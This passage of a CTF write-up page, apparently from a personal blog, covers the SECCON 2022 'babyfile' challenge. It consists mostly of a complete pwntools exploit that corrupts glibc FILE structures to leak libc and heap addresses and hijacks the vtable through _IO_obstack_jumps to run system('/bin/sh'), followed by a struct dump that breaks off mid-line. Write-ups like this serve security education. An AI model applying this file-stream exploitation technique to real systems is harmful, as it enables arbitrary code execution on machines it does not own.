<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>[SECCON CTF 2022 Quals] babyfile | repr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Introductionbabyfile is a file stream exploitation I did during the SECCON CTF 2022 Quals event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting">
<meta property="og:type" content="article">
<meta property="og:title" content="[SECCON CTF 2022 Quals] babyfile">
<meta property="og:url" content="https://n4sm.github.io/posts/babyfile/index.html">
<meta property="og:site_name" content="repr">
<meta property="og:description" content="Introductionbabyfile is a file stream exploitation I did during the SECCON CTF 2022 Quals event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-08-18T22:00:00.000Z">
<meta property="article:modified_time" content="2023-09-05T09:45:11.050Z">

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfmate</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = pwn.context.binary = pwn.ELF(<span class="string">&#x27;chall&#x27;</span>)</span><br><span class="line">libc = pwn.context.binary = pwn.ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line"><span class="comment"># pwn.context.timeout = 1000</span></span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source /home/nasm/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">io = <span class="literal">None</span></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">File</span>:</span><br><span class="line">    flags          = <span class="number">0x0</span></span><br><span class="line">    _IO_read_base  = <span class="number">24</span></span><br><span class="line">    _IO_read_end   = <span class="number">0x10</span></span><br><span class="line">    _IO_write_base = <span class="number">0x20</span></span><br><span class="line">    _IO_write_ptr  = <span class="number">0x28</span></span><br><span class="line">    _IO_write_end  = <span class="number">0x30</span></span><br><span class="line">    _IO_buf_base   = <span class="number">0x38</span></span><br><span class="line">    _IO_buf_end    = <span class="number">0x40</span></span><br><span class="line">    fileno         = <span class="number">0x70</span></span><br><span class="line">    vtable         = <span class="number">0xd8</span></span><br><span class="line">    obstack       = <span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">obstack</span>:</span><br><span class="line">    chunkfun       = <span class="number">56</span></span><br><span class="line">    extra_arg      = <span class="number">56</span>+<span class="number">16</span></span><br><span class="line">    use_extra_arg  = <span class="number">56</span>+<span class="number">16</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fflush</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trick</span>(<span class="params">offt, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;offset: &quot;</span>, <span class="built_in">str</span>(offt).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;value: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_ptr</span>(<span class="params">ptr: <span class="built_in">bytes</span>, offt: <span class="built_in">int</span>, debug=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> ptr[i]:</span><br><span class="line">            trick(offt + i, <span class="built_in">str</span>(ptr[i]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partial_write2</span>(<span class="params">ptr: <span class="built_in">bytes</span>, offt: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        trick(offt + i, <span class="built_in">str</span>(ptr[i]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partial_write</span>(<span class="params">ptr: <span class="built_in">bytes</span>, offt: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        trick(offt + i, <span class="built_in">str</span>(ptr[i]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_ptr</span>(<span class="params">ptr: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    write_ptr(ptr, File._IO_write_base)</span><br><span class="line">    </span><br><span class="line">    dest = (<span class="built_in">int</span>.from_bytes(ptr, byteorder=<span class="string">&quot;little&quot;</span>)+<span class="number">8</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    write_ptr(dest, File._IO_write_ptr)</span><br><span class="line"></span><br><span class="line">    fflush()</span><br><span class="line">    ret = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># do_allocate</span></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0xa8</span>), File.vtable)</span><br><span class="line">    fflush()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># _IO_file_underflow =&gt; _IO_default_pbackfail</span></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0x60</span>), File.vtable)</span><br><span class="line">    fflush()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    int</span></span><br><span class="line"><span class="string">    _IO_default_pbackfail (FILE *fp, int c)</span></span><br><span class="line"><span class="string">    =&gt; not _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="string">    =&gt; _IO_read_base == _IO_write_ptr</span></span><br><span class="line"><span class="string">    =&gt; _IO_read_end == _IO_write_ptr + 8</span></span><br><span class="line"><span class="string">    =&gt; _IO_write_end = right size</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    write_ptr(pwn.p64(<span class="number">0xfbad1800</span> | <span class="number">0x8000</span>), File.flags)</span><br><span class="line"></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0x70</span>), File._IO_write_base)</span><br><span class="line"></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0x78</span>), File._IO_write_ptr)</span><br><span class="line">    partial_write(pwn.p8(<span class="number">0xa0</span>), File.vtable)</span><br><span class="line">    write_ptr(pwn.p64(<span class="number">1</span>), File.fileno)</span><br><span class="line">    fflush()</span><br><span class="line"></span><br><span class="line">    leak = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x2160c0</span> + <span class="number">0x2d160</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)</span><br><span class="line">    libc.address = leak</span><br><span class="line"></span><br><span class="line">    leak_main_arena = leak + <span class="number">0x1ed5a0</span></span><br><span class="line"></span><br><span class="line">    heap = leak_ptr(pwn.p64(leak_main_arena)) - <span class="number">0x2a0</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;heap: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    _IO_obstack_jumps = leak + <span class="number">0x1E9260</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;_IO_obstack_jumps: <span class="subst">&#123;<span class="built_in">hex</span>(_IO_obstack_jumps)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit vtable =&gt; _IO_obstack_jumps</span></span><br><span class="line">    write_ptr(pwn.p64(_IO_obstack_jumps - <span class="number">8</span> * <span class="number">9</span>), File.vtable)</span><br><span class="line">    write_ptr(pwn.p64(heap + <span class="number">0x2a0</span>), File.obstack)</span><br><span class="line"></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0xff</span>), File._IO_read_base)</span><br><span class="line"></span><br><span class="line">    write_ptr(pwn.p64(libc.sym.system), obstack.chunkfun) <span class="comment"># fn ptr, system</span></span><br><span class="line">    write_ptr(pwn.p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))), obstack.extra_arg) <span class="comment"># arg</span></span><br><span class="line">    partial_write(pwn.p8(<span class="literal">True</span>), obstack.use_extra_arg)</span><br><span class="line"></span><br><span class="line">    fflush()</span><br><span class="line">    <span class="comment"># system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b&quot;cat flag-f81d1f481db83712a1128dc9b72d5503.txt&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">type = struct _IO_FILE &#123;</span></span><br><span class="line"><span class="string">/*      0      |       4 */    int _flags;</span></span><br><span class="line"><span class="string">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="string">/*      8      |       8 */    char *_IO_read_ptr;</span></span><br><span class="line"><span class="string">/*     16      |       8 */    char *_IO_read_end;</span></span><br><span class="line"><span class="string">/*     24      |       8 */    char *_IO_read_base;</span></span><br><span class="line"><span class="string">/*     32      |       8 */    char *_IO_write_base;</span></span><br><span class="line"><span class="string">/*     40      |       8 */    char *_IO_write_ptr;</span></span><br><span class="line"><span class="string">/*     48      |       8 */    char *_IO_write_end;</span></span><br><span class="line"><span class="string">/*     56      |       8 */    char *_IO_buf_base;</span></span><br><span class="line"><span class="string">/*     64      |       8 */    char *_IO_buf_end;</span></span><br><span class="line"><span class="string">/*     72      |       8 */    char *_IO_save_base;</span></span><br><span class="line"><span class="string">/*     80      |       8 */    char *_IO_backup_base;</span></span><br><span class="line"><span class="string">/*     88      |       8 */    char *_IO_save_end;</span></span><br><span class="line"><span class="string">/*     96      |       8 */    struct _IO_marker *_markers;</span></span><br><span class="line"><span class="string">/*    104      |       8 */    struct _IO_FILE *_chain;</span></span><br><span class="line"><span class="string">/*    112      |       4 */    int _fileno;</span></span><br><span class="line"><span class="string">/*    116      |       4 */    int _flags2;</span></span><br><span class="line"><span class="string">/*    120      |       8 */    __off_t _old_offset;</span></span><br><span class="line"><span class="string">/*    128      |       2 */    unsigned short _cur_column;</span></span><br><span class="line"><span class="string">/*    130      |       1 */    signed char _vtable_offset;</span></span><br><span class="line"><span class="string">/*    131      |       1 */    char _shortbuf[1];</span></span><br><span class="line"><span class="string">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="string">/*    136      |       8 */    _IO_lock_t *_lock;</span></span><br><span class="line"><span class="string">/*    144      |       8 */    __off64_t _offset;</span></span><br><span class="line"><span class="string">/*    152      |       8 */    struct _IO_codecvt *_codecvt;</span></span><br><span class="line"><span class="string">/*    160      |       8 */    struct _IO_wide_data *_wide_data;</span></span><br><span class="line"><span class="string">/*    168      |       8 */    struct _IO_FILE *_freeres_list;</span></span><br><span class="line"><span class="string">/*    176      |       8 */    void *_freeres_buf;</span></span><br><span class="line"><span class="string">/*    184      |       8 */    size_t __pad5;</span></span><br><span class="line"><span class="string">/*    192      |       4 */    int _mode;</span></span><br><span class="line"><span class="string">/*    196      |      20 */    char _unused2[20];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                               /* total size (bytes):  216 */</span></span><br><span class="line"><span class="string">                             &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct obstack          /* control current object in current chunk */</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  long chunk_size;              /* preferred size to allocate chunks in */</span></span><br><span class="line"><span class="string">  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */</span></span><br><span class="line"><span class="string">  char *object_base;            /* address of object we are building */</span></span><br><span class="line"